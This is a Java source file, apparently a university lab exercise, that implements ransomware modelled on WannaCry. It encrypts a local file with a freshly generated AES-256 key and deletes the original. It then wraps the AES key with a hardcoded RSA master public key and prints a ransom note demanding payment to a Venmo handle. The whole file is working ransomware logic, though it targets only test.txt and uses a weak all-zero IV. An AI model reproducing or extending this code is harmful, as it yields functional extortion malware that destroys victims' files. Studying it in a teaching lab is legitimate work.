package le.ac.uk.WannaCry;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.KeyFactory;
import java.security.spec.X509EncodedKeySpec;
import java.security.KeyStore.SecretKeyEntry;
import java.security.PublicKey;
import java.util.Base64;
import javax.crypto.SecretKey; // I added this for Secret Key? Not sure if that means SecretKeyEntry may be the wrong lib.
import javax.crypto.spec.IvParameterSpec;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;

public class WannaCry {
    public static void main(String[] args) throws Exception{
        // Gen 256-bit AES key - Lab3. 
        KeyGenerator Key_Generator = KeyGenerator.getInstance("AES");
        Key_Generator.init(256, new SecureRandom());
        SecretKey KEY_AES = Key_Generator.generateKey();

        byte[] fileBytes = null;
        try (FileInputStream fis = new FileInputStream("test.txt")) {
            fileBytes = fis.readAllBytes();
        } catch (FileNotFoundException e) {
            System.out.println("File not found: " + e.getMessage());
        } catch (IOException e) {
            System.out.println("Error reading file: " + e.getMessage());
        }
        if (fileBytes == null) return;

        byte[] encryptedFileBytes = null;
        // Content's encrypted using AES key, CBC, PKCS5. Lab3.
        IvParameterSpec Zero_Padding_IV = new IvParameterSpec(new byte[16]);
        Cipher AES_Cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        AES_Cipher.init(Cipher.ENCRYPT_MODE, KEY_AES, Zero_Padding_IV);
        encryptedFileBytes=AES_Cipher.doFinal(fileBytes);

        try (FileOutputStream fos = new FileOutputStream("test.txt.cry")) {
            if (encryptedFileBytes != null) fos.write(encryptedFileBytes);
        } catch (IOException e) {
            System.out.println("Error writing encrypted file: " + e.getMessage());
            return;
        }

        try {
            Files.delete(Path.of("test.txt"));
        } catch (IOException e) {
            System.out.println("Error deleting file: " + e.getMessage());
            return;
        }

        //Public key from masterPublicKeyBase64 - Lab1, Lab3.
        String masterPublicKeyBase64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpPqoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXdtcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w16YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1eWi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";
        Base64.Decoder decoder = Base64.getDecoder(); // From Lab1.
        byte[] Bytes_Key_Master = decoder.decode(masterPublicKeyBase64);
        // Wrap in X509EncodedKeySpec
        X509EncodedKeySpec Spec_Key = new X509EncodedKeySpec(Bytes_Key_Master); // From lab3. 
        KeyFactory Key_Factory = KeyFactory.getInstance("RSA");
        PublicKey Key_Master_Public = Key_Factory.generatePublic(Spec_Key);


        // AES key encrypted in bytes with RSA using the public  and master key. Lab3. 
        Cipher RSA_Cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding"); 
        RSA_Cipher.init(Cipher.ENCRYPT_MODE, Key_Master_Public);
        byte[] Aes_Key_Bytes = KEY_AES.getEncoded();
        byte[] Key_AES_Encrypted = RSA_Cipher.doFinal(Aes_Key_Bytes);

        // Write to AES.key the encrypted bytes. Lab1. 
        try (FileOutputStream fos = new FileOutputStream("aes.key")) {
            fos.write(Key_AES_Encrypted);
        }

        String ransomMessage = """
                Dear Victim - Please note that your files have now stolen and encrypted!

                If you want them back, let a girl a know. My venmo is pricessCatBurger28. 
                """;
        System.out.println(ransomMessage);
        return;
    }
}
